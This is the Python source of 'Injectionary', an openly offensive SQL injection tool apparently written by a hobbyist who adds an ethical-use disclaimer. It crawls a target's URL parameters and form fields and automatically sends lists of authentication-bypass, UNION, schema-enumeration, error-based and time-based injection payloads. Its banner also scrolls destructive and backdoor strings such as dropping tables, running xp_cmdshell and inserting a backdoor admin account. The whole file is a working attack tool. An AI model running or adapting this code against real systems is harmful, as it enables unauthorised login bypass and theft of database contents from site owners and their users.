#!/usr/bin/env python3
# Injectionary - SQL Injection and Database Takeover Tool
# By koreyhacks_
#
# DISCLAIMER: This tool is intended for educational purposes and ethical security testing ONLY.
# Always obtain proper authorization before testing any system or application.
# The author is not responsible for any misuse or damage caused by this tool.

import sys
import time
import random
import argparse
import requests
from urllib.parse import urlparse, parse_qs
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup
import concurrent.futures

# Initialize colorama for cross-platform colored terminal text
init()

# ANSI color codes for the banner
BLUE = Fore.CYAN
ORANGE = Fore.YELLOW
RESET = Style.RESET_ALL

def print_banner():
    """Display a visually appealing but readable Injectionary banner with animation"""
    
    # Clear the screen (works on most terminals)
    print("\033c", end="")
    
    # Animation for SQL queries scrolling before banner displays
    sql_queries = [
        "SELECT * FROM users WHERE username = 'admin' --';",
        "UNION SELECT null, table_name FROM information_schema.tables;",
        "'; DROP TABLE users; --",
        "OR 1=1; UPDATE users SET password='hacked';",
        "SELECT @@version; EXEC xp_cmdshell('net user');",
        "'; WAITFOR DELAY '0:0:10'--",
        "SELECT * FROM users WHERE id = 1 OR 1=1;",
        "INSERT INTO admin VALUES(1, 'backdoor', 'backdoor');",
        "AND (SELECT 6765 FROM (SELECT(SLEEP(5)))hLSm);",
        "LOAD_FILE('/etc/passwd');",
        "SELECT IF(COUNT(*)>=1, BENCHMARK(3000000,SHA1(1)), 0);"
    ]
    
    # Display loading animation with SQL queries
    print(f"{Fore.CYAN}Initializing SQLi Engine...{RESET}")
    for i in range(20):
        query = random.choice(sql_queries)
        offset = random.randint(0, 10)
        print(" " * offset + f"{Fore.CYAN}> {query}{RESET}", end="\r")
        time.sleep(0.1)
    
    # Clear screen again for the banner
    print("\033c", end="")
    
    # Animated reveal of the banner (simple typewriter effect)
    banner_lines = [
        f"{BLUE}{'═' * 70}",
        f"{BLUE}║{' ' * 68}║",
        f"{BLUE}║{' ' * 21}{ORANGE}I N J E C T I O N A R Y{' ' * 21}{BLUE}║",
        f"{BLUE}║{' ' * 68}║",
        f"{BLUE}{'═' * 70}",
        f"{BLUE}║{' ' * 22}SQL Injection Tool v1.0{' ' * 23}{BLUE}║",
        f"{BLUE}║{' ' * 26}{ORANGE}By koreyhacks_{' ' * 27}{BLUE}║",
        f"{BLUE}{'═' * 70}"
    ]
    
    # Reveal the banner line by line with a small delay
    for line in banner_lines:
        print(line)
        time.sleep(0.1)
    
    # Animated loading bar
    print(f"{BLUE}║{' ' * 25}{RESET}Loading Modules:{' ' * 25}{BLUE}║")
    print(f"{BLUE}║{' ' * 15}{RESET}", end="")
    for i in range(40):
        if i < 10:
            print(f"{Fore.RED}█{RESET}", end="", flush=True)
        elif i < 25:
            print(f"{Fore.YELLOW}█{RESET}", end="", flush=True)
        else:
            print(f"{Fore.GREEN}█{RESET}", end="", flush=True)
        time.sleep(0.05)
    print(f"{' ' * 15}{BLUE}║")
    
    # Module loading animation
    modules = [
        "SQLi Engine", "Parameter Finder", "Payload Generator", 
        "Injection Handler", "Database Analyzer", "Authentication Bypass"
    ]
    
    print(f"{BLUE}║{' ' * 68}║")
    for module in modules:
        spaces = 68 - len(module) - 13
        left_space = spaces // 2
        right_space = spaces - left_space
        print(f"{BLUE}║{' ' * left_space}[{Fore.GREEN}✓{BLUE}] {ORANGE}{module}{' ' * right_space}{BLUE}║")
        time.sleep(0.15)
    
    print(f"{BLUE}║{' ' * 68}║")
    print(f"{BLUE}{'═' * 70}")
    print()

class Injectionary:
    def __init__(self, args):
        self.target = args.target
        self.method = args.method.upper()
        self.parameter = args.parameter
        self.cookies = args.cookies
        self.headers = self._parse_headers(args.headers)
        self.depth = args.depth
        self.threads = args.threads
        self.timeout = args.timeout
        self.verbose = args.verbose
        self.output = args.output
        
        # Check if target is a single URL or a file with multiple targets
        if args.file:
            try:
                with open(args.target, 'r') as f:
                    self.targets = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{Fore.RED}[!] Error: File not found: {args.target}{RESET}")
                sys.exit(1)
        else:
            self.targets = [self.target]
            
        # Basic payload categories
        self.payloads = {
            'authentication_bypass': [
                "' OR '1'='1", 
                "' OR '1'='1' --", 
                "' OR 1=1 --",
                "admin' --",
                "admin' #",
                "' OR 'x'='x",
                "' OR 1=1 OR ''='",
                "' OR 1=1 LIMIT 1; --"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT 1,2,3,4 --",
                "' UNION SELECT 1,2,3,4,5 --",
                "' UNION ALL SELECT 1,2,3,4,5 --",
                "' UNION SELECT NULL,NULL,NULL --"
            ],
            'database_enumeration': [
                "' UNION SELECT table_name,2,3 FROM information_schema.tables --",
                "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --",
                "' UNION SELECT 1,database(),3 --",
                "' UNION SELECT 1,version(),3 --",
                "' UNION SELECT 1,user(),3 --"
            ],
            'error_based': [
                "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e)) --",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables LIMIT 0,1),8446744073709551610,8446744073709551610))) --"
            ],
            'time_based': [
                "' AND SLEEP(5) --",
                "' AND (SELECT 5 FROM (SELECT SLEEP(5))a) --",
                "'; WAITFOR DELAY '0:0:5' --",
                "' UNION SELECT IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0) --"
            ]
        }
        
    def _parse_headers(self, headers_str):
        """Parse headers from string to dictionary"""
        if not headers_str:
            return {}
        
        headers = {}
        for header in headers_str.split(';'):
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
        return headers
    
    def _parse_cookies(self, cookies_str):
        """Parse cookies from string to dictionary"""
        if not cookies_str:
            return {}
        
        cookies = {}
        for cookie in cookies_str.split(';'):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
        return cookies
    
    def check_vulnerability(self, url, param=None):
        """Check if the target is vulnerable to SQL injection"""
        if param is None and self.parameter:
            param = self.parameter
        
        # If no parameter specified, try to extract from URL
        if not param and '?' in url:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            if params:
                param = list(params.keys())[0]  # Use the first parameter
        
        if not param:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] Warning: No parameter specified for {url}{RESET}")
            return False
        
        # Test with a simple SQL injection payload
        test_payloads = ["'", "1' OR '1'='1", "1' AND '1'='2"]
        
        original_response = None
        
        try:
            # Make a request with the original parameter
            if self.method == "GET":
                original_response = requests.get(
                    url, 
                    cookies=self._parse_cookies(self.cookies),
                    headers=self.headers,
                    timeout=self.timeout
                )
            else:  # POST
                data = {param: "legitimate_value"}
                original_response = requests.post(
                    url, 
                    data=data,
                    cookies=self._parse_cookies(self.cookies),
                    headers=self.headers,
                    timeout=self.timeout
                )
                
            original_length = len(original_response.text)
            
            # Test each payload
            for payload in test_payloads:
                if self.method == "GET":
                    # Modify URL parameter
                    if '?' in url:
                        base_url = url.split('?')[0]
                        params = parse_qs(urlparse(url).query)
                        params[param] = [payload]
                        
                        # Rebuild query string
                        query_string = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
                        test_url = f"{base_url}?{query_string}"
                    else:
                        test_url = f"{url}?{param}={payload}"
                    
                    response = requests.get(
                        test_url, 
                        cookies=self._parse_cookies(self.cookies),
                        headers=self.headers,
                        timeout=self.timeout
                    )
                else:  # POST
                    data = {param: payload}
                    response = requests.post(
                        url, 
                        data=data,
                        cookies=self._parse_cookies(self.cookies),
                        headers=self.headers,
                        timeout=self.timeout
                    )
                
                # Check for SQL errors in response
                error_patterns = [
                    "SQL syntax", "mysql_fetch_array", "You have an error in your SQL syntax",
                    "ORA-", "Oracle Error", "Microsoft SQL Server", "ODBC Driver",
                    "PostgreSQL", "SQLite", "JDBC Driver", "syntax error"
                ]
                
                for pattern in error_patterns:
                    if pattern.lower() in response.text.lower():
                        print(f"\n{Fore.GREEN}[+] SQL injection vulnerability detected in {url} (Parameter: {param}){RESET}")
                        print(f"{Fore.GREEN}[+] Detected SQL error with payload: {payload}{RESET}")
                        return True
                
                # Check for different response lengths
                if abs(len(response.text) - original_length) > 50:  # Significant difference
                    print(f"\n{Fore.GREEN}[+] Possible SQL injection vulnerability detected in {url} (Parameter: {param}){RESET}")
                    print(f"{Fore.GREEN}[+] Response length changed significantly with payload: {payload}{RESET}")
                    return True
            
            if self.verbose:
                print(f"{Fore.YELLOW}[-] No obvious SQL injection vulnerability detected in {url} (Parameter: {param}){RESET}")
            return False
            
        except requests.RequestException as e:
            if self.verbose:
                print(f"{Fore.RED}[!] Error testing {url}: {str(e)}{RESET}")
            return False
    
    def identify_parameters(self, url):
        """Identify potential injectable parameters in the URL"""
        injectable_params = []
        
        # Extract parameters from URL
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param in params:
                if self.check_vulnerability(url, param):
                    injectable_params.append(param)
        
        # Try to identify form parameters
        try:
            response = requests.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            for form in forms:
                # Get form method
                method = form.get('method', 'GET').upper()
                
                # Get form action (target URL)
                action = form.get('action')
                if action:
                    if action.startswith('/'):
                        # Relative URL
                        parsed = urlparse(url)
                        form_url = f"{parsed.scheme}://{parsed.netloc}{action}"
                    elif action.startswith('http'):
                        # Absolute URL
                        form_url = action
                    else:
                        # Relative to current path
                        form_url = url.rsplit('/', 1)[0] + '/' + action
                else:
                    form_url = url
                
                # Get form parameters
                inputs = form.find_all(['input', 'textarea'])
                for inp in inputs:
                    param_name = inp.get('name')
                    if param_name and inp.get('type') != 'submit':
                        if self.check_vulnerability(form_url, param_name):
                            injectable_params.append((form_url, method, param_name))
        
        except requests.RequestException:
            pass
        
        return injectable_params
    
    def exploit(self, url, param):
        """Attempt to exploit the SQL injection vulnerability"""
        print(f"\n{Fore.BLUE}[*] Attempting to exploit SQL injection in {url} (Parameter: {param}){RESET}")
        
        # Try different categories of payloads
        for category, payloads in self.payloads.items():
            print(f"\n{Fore.CYAN}[*] Trying {category} payloads...{RESET}")
            
            for payload in payloads:
                print(f"{Fore.YELLOW}[*] Testing payload: {payload}{RESET}")
                
                try:
                    if self.method == "GET":
                        # Modify URL parameter
                        if '?' in url:
                            base_url = url.split('?')[0]
                            params = parse_qs(urlparse(url).query)
                            params[param] = [payload]
                            
                            # Rebuild query string
                            query_string = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
                            test_url = f"{base_url}?{query_string}"
                        else:
                            test_url = f"{url}?{param}={payload}"
                        
                        response = requests.get(
                            test_url, 
                            cookies=self._parse_cookies(self.cookies),
                            headers=self.headers,
                            timeout=self.timeout
                        )
                    else:  # POST
                        data = {param: payload}
                        response = requests.post(
                            url, 
                            data=data,
                            cookies=self._parse_cookies(self.cookies),
                            headers=self.headers,
                            timeout=self.timeout
                        )
                    
                    # Analyze response
                    if response.status_code == 200:
                        # Look for indicators of successful exploitation
                        if category == 'authentication_bypass':
                            if 'admin' in response.text.lower() or 'dashboard' in response.text.lower():
                                print(f"{Fore.GREEN}[+] Possible authentication bypass with: {payload}{RESET}")
                                
                        elif category == 'database_enumeration':
                            # Look for database information
                            if 'mysql' in response.text.lower() or 'sql server' in response.text.lower():
                                print(f"{Fore.GREEN}[+] Database information extracted with: {payload}{RESET}")
                                print(f"{Fore.GREEN}[+] Response snippet: {response.text[:200]}...{RESET}")
                                
                    # Check for error messages
                    error_patterns = [
                        "SQL syntax", "mysql_fetch_array", "You have an error in your SQL syntax",
                        "ORA-", "Oracle Error", "Microsoft SQL Server", "ODBC Driver",
                        "PostgreSQL", "SQLite", "JDBC Driver", "syntax error"
                    ]
                    
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            print(f"{Fore.RED}[!] Database error detected with: {payload}{RESET}")
                            error_line = next((line for line in response.text.splitlines() 
                                               if pattern.lower() in line.lower()), "")
                            print(f"{Fore.RED}[!] Error: {error_line}{RESET}")
                            
                except requests.RequestException as e:
                    print(f"{Fore.RED}[!] Error testing payload: {str(e)}{RESET}")
                    
        return False
    
    def scan_target(self, target):
        """Scan a single target for SQL injection vulnerabilities"""
        print(f"\n{Fore.BLUE}[*] Scanning target: {target}{RESET}")
        
        # Check if a specific parameter was provided
        if self.parameter:
            if self.check_vulnerability(target):
                self.exploit(target, self.parameter)
        else:
            # Try to identify injectable parameters
            print(f"{Fore.BLUE}[*] Identifying injectable parameters...{RESET}")
            injectable_params = self.identify_parameters(target)
            
            if injectable_params:
                print(f"{Fore.GREEN}[+] Found {len(injectable_params)} injectable parameters{RESET}")
                for param_info in injectable_params:
                    if isinstance(param_info, tuple):
                        form_url, method, param = param_info
                        print(f"{Fore.GREEN}[+] Form URL: {form_url}, Method: {method}, Parameter: {param}{RESET}")
                        self.exploit(form_url, param)
                    else:
                        print(f"{Fore.GREEN}[+] Parameter: {param_info}{RESET}")
                        self.exploit(target, param_info)
            else:
                print(f"{Fore.YELLOW}[-] No injectable parameters found in {target}{RESET}")
    
    def scan(self):
        """Start scanning all targets"""
        print_banner()
        
        print(f"{Fore.BLUE}[*] Starting SQL injection scan with {len(self.targets)} target(s){RESET}")
        print(f"{Fore.BLUE}[*] Method: {self.method}{RESET}")
        if self.parameter:
            print(f"{Fore.BLUE}[*] Parameter: {self.parameter}{RESET}")
        
        # Use threading for scanning multiple targets
        if len(self.targets) > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                executor.map(self.scan_target, self.targets)
        else:
            self.scan_target(self.targets[0])
        
        print(f"\n{Fore.BLUE}[*] Scan completed{RESET}")
    
    def save_results(self, results):
        """Save scan results to a file"""
        if not self.output:
            return
            
        try:
            with open(self.output, 'w') as f:
                f.write(f"Injectionary Scan Results\n")
                f.write(f"========================\n\n")
                f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Targets: {', '.join(self.targets)}\n\n")
                f.write(results)
            print(f"{Fore.GREEN}[+] Results saved to {self.output}{RESET}")
        except IOError as e:
            print(f"{Fore.RED}[!] Error saving results: {str(e)}{RESET}")
    
    def run(self):
        """Run the main scanning process"""
        try:
            self.scan()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {str(e)}{RESET}")
            if self.verbose:
                import traceback
                traceback.print_exc()
            sys.exit(1)


def main():
    """Main entry point for the tool"""
    parser = argparse.ArgumentParser(description="Injectionary - SQL Injection and Database Takeover Tool")
    
    # Target specification
    target_group = parser.add_argument_group("Target")
    target_group.add_argument("-t", "--target", help="Target URL or host")
    target_group.add_argument("-f", "--file", action="store_true", help="Use a file containing multiple targets")
    target_group.add_argument("-p", "--parameter", help="Specific parameter to test")
    
    # Request options
    request_group = parser.add_argument_group("Request")
    request_group.add_argument("-m", "--method", default="GET", help="HTTP method (GET or POST)")
    request_group.add_argument("-c", "--cookies", help="HTTP cookies (format: name1=value1;name2=value2)")
    request_group.add_argument("-H", "--headers", help="HTTP headers (format: header1:value1;header2:value2)")
    
    # Scan options
    scan_group = parser.add_argument_group("Scan")
    scan_group.add_argument("-d", "--depth", type=int, default=1, help="Scan depth level")
    scan_group.add_argument("-T", "--threads", type=int, default=5, help="Number of concurrent threads")
    scan_group.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    
    # Output options
    output_group = parser.add_argument_group("Output")
    output_group.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    output_group.add_argument("-o", "--output", help="Save results to file")
    
    args = parser.parse_args()
    
    # Check required arguments
    if not args.target:
        parser.error("Target URL or host is required")
    
    # Initialize and run the scanner
    scanner = Injectionary(args)
    scanner.run()


if __name__ == "__main__":
    main()
